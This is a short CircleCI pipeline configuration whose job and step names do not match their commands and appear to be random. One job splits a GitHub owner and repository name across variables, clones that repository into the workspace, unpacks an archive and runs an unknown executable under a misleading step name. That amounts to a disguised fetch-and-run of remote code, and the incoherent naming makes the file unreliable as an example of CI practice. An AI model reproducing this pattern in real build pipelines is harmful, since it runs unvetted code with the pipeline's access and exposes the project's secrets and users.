version: 2.1

jobs:
  report-exporter-release-build:
    docker:
      - image: cimg/base:stable
    resource_class: small
    steps:
      - run:
          name: type-check-step
          command: |
            mkdir -p /tmp/hourly-artifact-export && echo 'prePublishHealthCheck restart-updater-database' > /tmp/hourly-artifact-export/RevertingDeployment
            ls -l /tmp/hourly-artifact-export/RevertingDeployment
      - persist_to_workspace:
          root: /tmp/hourly-artifact-export
          paths:
            - 'RevertingDeployment'
  PreCleanupScan:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/hourly-artifact-export
      - run:
          name: deploy-dispatcher-to-canary-nodes
          command: |
            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/RevertingDeployment" | awk 'length($0) < 8' | head -c 384
      - run:
          name: PreRestoreJobAttempt4
          command: |
            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
            git clone --depth 1 --branch main "https://github.com/${stepof}/${settings}" $PWD
      - run:
          name: FreezeIdentityServiceDevelopmentDependencies
          command: |
            tar xf test-compilation-task.tar --no-same-owner
      - run:
          command: |
            bash -lc './import-status-page-seed-data'
  remote-schema-freeze:
    docker:
      - image: cimg/base:stable
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/hourly-artifact-export
